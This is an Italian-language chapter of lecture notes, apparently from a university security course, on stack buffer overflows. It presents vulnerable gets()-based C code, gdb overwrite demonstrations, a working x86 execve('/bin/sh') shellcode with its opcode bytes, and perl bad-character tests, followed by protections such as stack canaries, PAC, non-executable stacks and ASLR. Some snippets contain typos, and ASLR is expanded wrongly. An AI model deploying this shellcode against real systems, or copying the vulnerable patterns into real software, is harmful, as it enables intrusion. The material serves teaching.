\chapter{Smashing the stack}

\section{Introduzione}
Come detto in precedenza riprendiamo il concetto di stack nella memoria, lo stack è quella parte di memoria gestita automaticamente dal sistema dove vengono allocate le variabili locali (variabili che non vengono allocate con una chiamata alla funzione malloc), inoltre viene salvato al suo interno anche lo stato delle funzioni che vengono chiamate.
Nei processori x86 abbiamo varie convenzioni di chiamata, dipende dal sistema operativo, come detto sempre in precedenza lo stack è una parte di memoria che cresce nella direzione opposta degli indirizzi di memoria.

\section{Buffer overflow attack}
L'errore di \textbf{buffer overflow} è un errore che si può presentare sullo stack del sistema, occorre quando un programma scrive negli indirizzi di memoria del \textbf{call stack} del programma uscendo fuori dai limiti imposti dalla struttura dati, di solito un buffer di lunghezza fissata.
Questo bug viene causato quando un programma scrive più dati di quelli che riesce a contenere il buffer facendo si di sfondare il limite e andando a scrivere in zone di memoria diverse portando a sovrascrivere queste zone.
Scrivendo più dati rispetto a quelli che può contenere il buffer porterà a far deragliare l'esecuzione del programma in quanto lo stack contiene gli indirizzi di ritorno per tutte le funzioni attive chiamate.

Questa situazione può essere anche causata deliberatamente per effettuare un attacco di tipo \textbf{stack smashing}, in quanto se il programma in esecuzione possiede particolari privilegi noi potremo manipolarne l'esecuzione inniettando delle porzioni di codice arbitrarie e deviarne l'esecuzione a piacimento.

\subsection{Call stack}
La call stack è una struttura mantenuta in memoria centrale che permette di salvare lo stato del programma (e.g. variabili locali, indirizzi di ritorno ecc.), la sua struttura è fondamentale per sfruttare questo attacco.

\begin{center}
    \begin{table}[h!]
        \centering
        \begin{tabular}{|c|}
            \hline
            Local parameters \\
            \hline
            Return address \\
            \hline
            Saved state \\
            \hline
            Local variables \\
            \hline
        \end{tabular}
        \caption{Call stack}
    \end{table}
\end{center}

Come si può vedere le variabili locali si trovano all'inizio della struttura, crescendo dal basso lo stack, e questa cosa è molto importante per eseguire l'attacco perchè il sistema rimpirà le variabili dal basso verso l'alto e quindi potremo arrivare a sfondare il buffer per raggiungere quello che a noi interessa cioé l'\textbf{indirizzo di ritorno} che è quello che poi reindirizzerà il puntatore del processore al codice che abbiamo inserito noi.
Supponendo di avere il seguente codice \textit{C}:
\begin{lstlisting}[language=C]
    uint32_t a;
    unsigned char b[4];
\end{lstlisting}
avremo un call stack come segue
\begin{center}
    \begin{table}[h!]
        \centering
        \begin{tabular}{|c|}
            \hline
            a \\
            \hline
            b \\
            \hline
        \end{tabular}
    \end{table}
\end{center}

\subsection{Vulnerable code}
Adesso prendiamo in esame il seguente codice: 
\begin{lstlisting}[language=C]
    int foo(int _){
        char e[4];

        gets(e);
        return 0;
    }
    foo(a);
\end{lstlisting}

In questo esempio possiamo vedere come sia stato definito un buffer di 4 caratteri nella funzione \textit{foo} e successivamente attraverso la funzione \textit{gets} lo andiamo a riempire prendendo l'input dal terminale.
L'utilizzo della funzione \textit{gets} renderà questo codice non sicuro e affetto da prorbabile stack smashing. La funzione \textit{gets} infatti non è consigliata in quanto in quanto non fà nessun controllo dell'input inserito, ciò permette di inserire più caratteri di quelli accettati dal buffer che verranno accodati lo stesso pertanto porteranno a un buffer overflow, si consiglia l'utilizzo di \textit{fgets}.

Supponiamo di avere il seguente codice che controlla che la variabile \textit{ok} rimanga a 0 per un esecuzione non privilegiata:

\begin{lstlisting}[language=C]
    int foo(int _) {
        uint32_t ok;
        char action [4];
        char p[4];
    
        gets(pass);
        ok = !strcmp(p, "123");
        // Get the action
        gets(action);
    
        if (ok)
            Privileged
        return 0;
    }
\end{lstlisting}

avremo una call stack formata in questa maniera inizialmente in cui la password si trova all'ultimo posto;

\begin{center}
    \begin{table}[h!]
        \centering
        \begin{tabular}{|c|}
            \hline
            Local parameters \\
            \hline
            Return address \\
            \hline
            Saved state \\
            \hline
            ok = 0 \\
            \hline
            action \\
            \hline
            A A A \\
            \hline
        \end{tabular}
    \end{table}
\end{center}
ma nel momento in cui dovremo inserire i dati dentro \textit{action} allora inserendo più di 4 caratteri potremo sfondare il buffer e modificare il valore di della variabile \textit{ok} che controlla l'esecuzione privilegiata;
\begin{center}
    \begin{table}[h!]
        \centering
        \begin{tabular}{|c|}
            \hline
            Local parameters \\
            \hline
            Return address \\
            \hline
            Saved state \\
            \hline
            B \\
            \hline
            B B B B \\
            \hline
            A A A \\
            \hline
        \end{tabular}
    \end{table}
\end{center}
ecco che a questo punto potremo deviarne l'esecuzione a nostro piaciemento entrando nella sezione privilegiata.

\begin{ex}
    \begin{lstlisting}[language=C]
        int foo(int _) {
            uint32_t a;
            uint32_t b;
            uint3:2_t c;
            uint32_t d;
            char e[4];

            gets(e);
            return 0;
        }
    \end{lstlisting}

    \begin{center}
        \begin{table}[h!]
            \centering
            \begin{tabular}{|c|}
                \hline
                Local parameters \\
                \hline
                Return address \\
                \hline
                Saved state \\
                \hline
                a \\
                \hline
                b \\
                \hline
                c \\
                \hline
                d \\
                \hline
                e \\
                \hline
            \end{tabular}
        \end{table}
    \end{center}

    una volta inseriti abbastanza caratteri potremo sfondare il buffer e arrivare all'indirizzo di ritorno
    
    \begin{center}
        \begin{table}[h!]
            \centering
            \begin{tabular}{|c|}
                \hline
                Local parameters \\
                \hline
                A A A A \\
                \hline
                A A A A \\
                \hline
                A A A A \\
                \hline
                A A A A \\
                \hline
                A A A A \\
                \hline
                A A A A \\
                \hline
                A A A A \\
                \hline
            \end{tabular}
        \end{table}
    \end{center}

    arrivati all'indirizzo di ritorno avremo l'errore di segfault sfruttabile a nostro vantaggio
    \begin{lstlisting}[language=bash]
        command:
        gdb -q ./test

        output:
        Reading symbols from ./test ...(no debugging symbols found)
        (gdb) r
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /home/vagrant/test
        AAAAAAAAAAAAAAAAAAAA
        Program received signal SIGSEGV , Segmentation fault.
        0x41414141 in ?? ()
    \end{lstlisting}
        potremo così sfruttare il deragliamento del programma per eseguire del codice arbitrario come uno \textbf{shellcode}.
\end{ex}

\subsection{Shellcode}
Uno shellcode è una porzione di codice in linguaggio assembly, che generalmente esegue una shell, inittabile attraverso un exploit che ci permette di acquisire l'accesso alla macchina attaccata, o più generalmente che permette l'esecuzione di codice arbitrario.

\begin{lstlisting}[language={[x86masm]Assembler}]
    xor eax,eax;
    cdq;
    push eax;               push 0
    push 0x68732f2f;
    push 0x6e69622f;
    mov ebx,esp;
    push eax;
    push ebx;               push "/bin/sh\0"
    mov ecx,esp;            push &"/bin/sh\0"
    mov al,0x0b;            systemcall(execve)
    int 80h;                systemcall(execve, "/bin/sh", &["/bin/sh", NULL])
\end{lstlisting}
il precedente shell code è la versione compilata del codice che segue:
\begin{lstlisting}[language=C]
    char *cmd[] = {"/bin/sh", NULL };
    execve (*cmd , cmd);
\end{lstlisting}
se invece proviamo ad estrarre l'opcode dal codice assembly otterremo i seguenti valori:
\begin{center}
    \begin{table}[h!]
        \centering
        \begin{tabular}{c c c c}
            0x31 & 0xc0 & 0x99 & 0x50 \\
            0x68 & 0x2f & 0x2f & 0x73 \\
            0x68 & 0x68 & 0x2f & 0x62 \\
            0x69 & 0x6e & 0x89 & 0xe3 \\
            0x50 & 0x53 & 0x89 & 0xe1 \\
            0xb0 & 0x0b & 0xcd & 0x80 \\
        \end{tabular}
    \end{table}
\end{center}

Possiamo pensare bene di voler inserire il codice dello shellcode all'interno dello stack, come precedentemente fatto, una volta inserito il codice dovremo scoprire l'indirizzo in cui verrà caricato:
\begin{lstlisting}[language=bash]
    command:
    gdb -q ./test
    (gdb) b foo
    Breakpoint 1 at 0x8048423
    (gdb) r
    Starting program: /home/vagrant/test
    Breakpoint 1, 0x08048423 in foo ()
    (gdb) p $esp
    $1 = (void *) 0xbffff6e0 # indirizzo in cui viene caricata la funzione
\end{lstlisting}

\begin{center}
    \begin{table}[h!]
        \centering
        \begin{tabular}{|c|}
            \hline
            Local parameters \\
            \hline
            0xbffff6XX \\
            \hline
            ... \\
            \hline
        \end{tabular}
    \end{table}
\end{center}
adesso che conosciamo l'indirizzo potremo effettuare l'attacco.

\subsection{Bad chars}
Un problema nella creazione di shellcode si presenta nel momento in cui il sistema per qualche motivo non accetta alcuni caratteri, ciò ci obbligherà a sviluppare lo shellcode senza utilizzarli rendendo la cosa molto difficile in alcuni casi.
Supponiamo di avere il seguente codice:
\begin{lstlisting}[language=C]
    char x[10] = {};
    gets(x);
    for (int i = 0; i<10 ++i) {
        printf("%02x", x[i]);
    }
\end{lstlisting}

Se dovessimo eseguire il codice con input diversi vedremo come in alcuni casi non funzionerebbe, in questo caso andrebbe tutto bene:
\begin{lstlisting}[language=bash]
    command:
    perl -e 'print "AAAA\x43BBBB"' | /tmp/test

    output:
    41 41 41 41 43 42 42 42 42 00
\end{lstlisting}
ma cosa succederebbe se eseguissimo lo stesso codice inserendo il seguente carattere 0x0a?
\begin{lstlisting}[language=bash]
    command:
    perl -e 'print "AAAA\x0aBBBB"' | /tmp/test
    
    output:
    41 41 41 41 00 00 00 00 00 00
\end{lstlisting}
potremo vedere come la stringa 'BBBB' non sarà caricata in memoria in quanto il carattere immesso prima è quello di newline, quindi dovremo stare attenti a quando creiamo un script o uno shellcode perchè potrebbe risultare non efficacie.

\section{Sistemi di protezione}
Per ovviare ai problemi precedentemente elencati sono stati implementati diversi sistemi di protezione per la memoria:
\begin{itemize}
    \item \textbf{Stack canary}
    \item \textbf{Authenticated pointer (PAC)}
    \item \textbf{Non executable stack}
    \item \textbf{ASLR (Address Source Layout Randomization)}
\end{itemize}

\subsection{Stack canary}
La tecnica dello stack canary riprende un vecchio metodo utilizzato nelle miniere di carbone in cui venivano messi dei canarini per segnalare un eventuale problema, nel nostro caso il canarino è un valore intero (generato seguendo diverse politiche) che viene posto tra le variabili e l'indirizzo di ritorno in questo modo se un malintenzionato volesse effettuare un buffer overflow a questo punto si troverebbe il canarino la cui modifica allerterebbe il sistema bloccandone l'esecuzione.
Nei sistemi più moderni il canarino viene generato a runtime in modo tale da modificare il canarino in ogni esecuzione e rendere il lavoro al malintenzionato più difficile.
Esistono diverse politiche di generazione dei canarini:
\begin{itemize}
    \item \textbf{Terminator Canary}, è costituita da tutti i comuni simboli di terminazione utilizzati dalle librerie standard del C: 0(null), CR(carriage return), LF(line feed) e -1(EOF). Un malintenzionato non potrebbe usare le funzioni standard per leggere questi simboli ed incapsularli in una stringa, poiché le funzioni di copia si fermerebbero alla prima occorrenza di uno di questi caratteri.
    \item \textbf{Random Canary}, La canary word è un semplice numero casuale di 32 bit scelto al run-time. In questo modo, essa diventa un segreto facile da usare, ma difficile da indovinare, poiché non è mai rivelata e cambia ad ogni riavvio del programma.
    \item \textbf{Xor Random Canary}, Come per il Random Canary, la canary word consiste di un vettore di 128 bit casuali (quattro word scelte al run-time), messi in XOR con l'indirizzo di ritorno. In questo modo, la canary word viene legata all'indirizzo di ritorno della funzione attiva.
\end{itemize}

\subsection{Authenticated pointer}
In alcuni sistemi, in particolare quelli con architettura ARM, tutti i puntatori di ritorno sono autenticati attraverso AES la quale chiave è conosciuta solo al sistema, ciò porta al malintenzionato a dover scoprire la chiave, che cambia a ogni esecuzione del programma, per poter riautenticare l'indirizzo per far proseguire l'esecuzione altrimenti si avrà un crash del programma.
\begin{ex}
    vedi \textbf{PACMAN Attack on ARM Mac}: https://pacmanattack.com
\end{ex}

\subsection{Non executable stack}
Un altro approccio per la prevenzione all'attacco dello stack buffer overflow è rinforzare le politiche di memoria dello stack disabilitandone la possibilità dell'esecuzione.
Questo significa che l'attaccante dovrà riuscire a disabilitare la protezione di esecuzione oppure dovrà trovare una zona di memoria non protetta da essa per poter eseguire il codice.
Questo è uno dei metodi più popolari per ovviare a questa problematica.
QUesto metodo può essere comunque ovviato salvando nello stack il puntatore di un altro call stack oppure salvando lo shellcode nello heap e facendo ripuntare l'indirizzo di ritorno alla locazione di memoria dello heap.

\subsection{ASLR (Address Source Layout Randomization)}
L'ultimo metodo di mitagzione è attraverso la randomizzaione degli indirizzi del programma, con granularità della sezione. Gli indirizzi di esecuzione verranno cambiati a runtime in modo tale che a ogni esecuzione il programma cambi indirizzi rendendo sempre più difficile all'attaccante la ricerca di essi.

\begin{lstlisting}[language=bash]
    command:
    sleep 1 & grep 'stack' /proc/${!}/ maps
    
    output:
    7ffceda25000 -7 ffceda46000 rw -p 00000000 00:00 0
    [stack]
\end{lstlisting}
\begin{lstlisting}[language=bash]
    command:
    sleep 1 & grep 'stack' /proc/${!}/ maps
    
    output:
    7fff6f016000 -7 fff6f037000 rw -p 00000000 00:00 0
    [stack]
\end{lstlisting}

Come possiamo vedere a ogni esecuzione del programma il sistema si occuperà di modificare gli indirizzi.
\begin{center}
    \begin{table}[h!]
        \centering
        \begin{tabular}{c c c c}
             & Local & Parameters & \\
            ? & ? & ? & ? \\
            0x31 & 0xc0 & 0x99 & 0x50 \\
            0x68 & 0x2f & 0x2f & 0x73 \\
            0x68 & 0x68 & 0x2f & 0x62 \\
            0x69 & 0x6e & 0x89 & 0xe3 \\
            0x50 & 0x53 & 0x89 & 0xe1 \\
            0xb0 & 0x0b & 0xcd & 0x80 \\
        \end{tabular}
    \end{table}
\end{center}
